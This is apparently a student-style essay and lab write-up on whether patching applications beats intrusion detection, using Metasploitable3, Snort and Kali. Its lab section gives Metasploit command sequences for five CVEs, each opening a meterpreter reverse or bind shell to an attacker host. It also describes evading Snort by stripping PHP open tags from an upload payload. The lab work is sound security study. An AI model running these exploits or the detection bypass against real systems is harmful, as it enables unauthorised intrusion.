NOTE: A markdown version with improved readability can be found at <>. The repository also contains the snort.conf and any modified rules used in the examples, and the modified payload to avoid Snort detection.

Is it easier to to fix the application than to detect attacks? To look into this question, we will look at the overview of both statements, and think about the pros and cons of each approach. We will also look at some attack scenarios made using virtual machines, with 1 running an intrusion detection system and vulnerable web applications, and another virtual machine running software that could exploit these rules. 
Fixing the application in a perfect world would make more sense. After an exploit has been discovered or disclosed, the application vendor would fix and publish a new version where the flaw is fixed, and anyone using the application would update it. However due to various reasons this does often not happen as smoothly. For example the product is not being supported anymore so any patches are not being released, the flaw is not critical enough to take time away from developing features. From the flaw detection side, the reporter might not disclose it in order to profit from selling the information. Some companies even discourage sending vulnerability reports by trying to sue anyone who sends them information about security vulnerabilities in their application. This is a sure way to make anyone finding vulnerabilities to go looking other sources to benefit from the information.
The third part of this puzzle is the user of the application. If they do not keep their software up-to-date, the vulnerability will not be fixed. This might be due to ignorance, or laziness to update the software. In some cases other pieces of software depend on that exact version of software, making it impossible to update without breaking some business solutions. This can often happen with large enterprises with multiple business-critical applications depending on each other and running for years. The problem will become more difficult to solve due to more parts of the business depending on the working configuration and administrators responsible for updating the integrations leaving the company. Until at some point even a minor but critical security update becomes too cumbersome to update. At this stage some companies will as a precaution they will wrap their systems infrastructure using an Intrusion Detection System. Which brings us to the second statement, would it be easier to just detect attacks and deal with them as they come?
Intrusion Detection Systems range from antivirus-software running on a home computer to complex company-wide monitoring and reporting systems that monitor all network and application activity within the company. Depending on the kind of software they might do complex analysis on network traffic or check application signatures for known viruses. Some systems might even track and monitor employee activity inside the systems to report on threats like employees trying to access sensitive data or running potentially malicious software. Intrusion Detection Systems take pressure keeping track of each piece of software being up-to-date, and even updated software is no guarantee that the systems they are running on are safe. IDS' are often standalone or packaged solutions which keep up-to-date themselves, with daily updates being able to detect the newest threats. Companies offering IDS' often have great support systems, and larger ones can tailor solutions for companies depending on their needs and possible threats. They also offer a wide range of features, and can offer more general security to companies networks, having overall-security instead of maintaining and fixing individual exploits and keeping individual pieces of software updated. Since IDS' can also monitor and report suspicious network activity, they have more chance of discovering a sophisticated attacker, or someone gathering information over a long period of time. By tracking normal network activity over a period of time, you can establish a sort of baseline for normal activity, and look at places where network activity differs from normal operations. So why aren't IDS' the superior solution? Firstly, security software is still software. It has bugs, oversights and even security flaws attackers can exploit. They need to be kept updated like any other software. Relying too much on an IDS' is also a great way for any attackers to only have one obstacle to overcome. The attacker can focus all resources and research on the IDS itself, finding any methods to break or bypass it. Once that is done, and anything behind the IDS can usually be extremely vulnerable. They also fall victim to the same problems as any other application developer might face with updating software, as discussed earlier in the essay.

Lets look at some examples. An example target system is MetaSploitable3 (https://github.com/rapid7/metasploitable3), which is designed to run intentionally vulnerable software. We install Snort (https://www.snort.org/) which is a network monitoring tool which can be used to run as an intrusion detection system. Then we use Kali (https://www.kali.org/), which is a version of Linux with multiple penetration testing tools used to detect and exploit vulnerabilities in software.

Technical information
Target machine:
MetaSploitable3 - Version built with commit https://github.com/rapid7/metasploitable3/commit/7f772162232d2a904be22588a0295742b3cd5d4e
Snort - Version 2.9.9.0 and using rules "snortrules-snapshot-2976"
WinPCap - Version 4.1.1, required by Snort
Snort.conf used - <url>

Attacker machine:
Kali version - kali-linux-2016.2-amd64 running as Live-CD

Legend used in reports
<REMOTEHOST> = IP address of the target machine
<LOCALHOST> = IP address of the attacker machine
<SNORTINTERFACE> = Network interface of the target machine that Snort is listening on. These can be listed in Snort using the command snort.exe -W

Command used to run Snort: 
`snort.exe -c C:\Snort\etc\snort.conf -i <SNORTINTERFACE> -A console -k none`

Attacks discovered by Snort IDS
1. CVE-2016-3087 - Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution
	1. `use exploit/multi/http/struts_dmi_rest_exec`
	2. `set RHOST <REMOTEHOST>`
	3. `set RPORT 8282`
	4. `set payload java/meterpreter/reverse_tcp`
	5. `set LHOST <LOCALHOST>`
	6. `run`

2. CVE-2014-3120 - ElasticSearch Dynamic Script Arbritrary Java Execution
	1. `use exploit/multi/elasticsearch/script_mvel_rce`
	2. `set RHOST <REMOTEHOST>`
	3. `set payload java/meterpreter/reverse_tcp`
	4. `set LHOST <LOCALHOST>`
	5. `run`

3. CVE-2010-0219 - AXIS2 / SAP BusinessObjects Authenticated Code Execution (via SOAP)
	1. `use exploit/multi/http/axis2_deployer`
	2. `set RHOST <REMOTEHOST>`
	3. `set RPORT 8282`
	4. `set payload java/meterpreter/reverse_tcp`
	5. `set LHOST <LOCALHOST>`
	5. `run`

Now lets look at 2 attacks undiscovered by Snort IDS:
1. CVE-2015-2342 - Java JMX Server Insecure Configuration Java Code Execution
	1. `use exploit/multi/misc/java_jmx_server`
	2. `set RHOST <REMOTEHOST>`
	3. `set RPORT 1617`
	4. `set payload java/meterpreter/reverse_tcp`
	5. `set LHOST <LOCALHOST>`
	6. `run`
The reason the former exploit was not discovered was that the rule monitoring the exploit was not enabled. In real life this sort of oversight is possible if the IDS software is configured incorrectly.

The following exploit is discovered by Snort, but by modifying the payload code we can easily bypass Snort detection, 
demonstrating how IDS systems can in some cases be made ineffective.
Note: If you get the following error when performing the exploit:
Exploit failed: NoMethodError undefined method '[]' for nil:nilClass
Make sure you have version with this fix implemented:
https://github.com/rapid7/metasploit-framework/commit/f838c9990fa3a7858297ada47288cc67f04d87e4
The <PATHTOEXPLOIT> file can be found here <URL>

2. CVE-2016-2019 - Wordpress Ninja Forms Unauthenticated file upload
	1. `use exploit/unix/webapp/wp_ninja_forms_unauthenticated_file_upload`
	2. `set RHOST <REMOTEHOST>`
	3. `set RPORT 8585`
	4. `set TARGETURI /wordpress/`
	5. `set FORM_PATH /index.php/king-of-hearts/`
	To alert Snort:
	6. `set payload php/meterpreter/bind_tcp`
	7. `set LHOST <LOCALHOST>`
	8. `run`
	To not alert Snort:
	6. `set payload generic/custom`
	7. `set payloadfile <PATHTOEXPLOIT> (e.g /root/cve_2016-2019_undetected.php)`
	8. `run`
Avoiding the alert was discovered by looking at the rules of the alert. It was monitoring malicious upload code by looking for `<?`-php tags. Replacing these tags was in the payload was the only thing needed to avoid detection.

So looking at the examples even with IDS some attacks can slip by undetected. So from a security standpoint, which would be the better solution? The correct solution lies in using both. Having the latest version of software running on the systems is priority here, with work needed to make sure they work correctly with other software and are kept up to date. An IDS should be deployed to monitor overall network activity and to those reports should be used to identify the biggest risks in the system and then finding ways to fix them. Relying on both options is the best way to minimize threat to systems, and giving attackers difficulty finding exploits without being detected is the best way to discourage them from trying to infiltrate your systems.